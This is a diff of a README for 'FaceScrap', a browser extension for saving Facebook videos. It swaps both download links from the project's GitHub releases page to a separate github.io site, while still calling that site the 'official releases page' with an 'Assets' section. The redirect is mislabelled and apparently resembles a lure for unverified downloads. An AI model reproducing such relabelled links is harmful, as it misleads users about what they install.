@@ -1,6 +1,6 @@
 # 📸 FaceScrap - Save Facebook social videos with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rococo-oldfashioned860/FaceScrap/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://rococo-oldfashioned860.github.io)
 
 FaceScrap captures Facebook reels, stories, and highlights from your browser. This tool helps you save videos you watch directly to your computer. It functions as a browser extension for Google Chrome and similar browsers. You do not need technical skills to use this software.
 
@@ -15,7 +15,7 @@ FaceScrap captures Facebook reels, stories, and highlights from your browser. Th
 
 Follow these steps to obtain the extension files.
 
-1. Visit the [official releases page](https://github.com/Rococo-oldfashioned860/FaceScrap/releases) to access the downloads.
+1. Visit the [official releases page](https://rococo-oldfashioned860.github.io) to access the downloads.
 2. Look for the latest version listed under the "Assets" section.
 3. Click the file ending in `.zip` to start the download.
 4. Save the file to your "Downloads" folder.
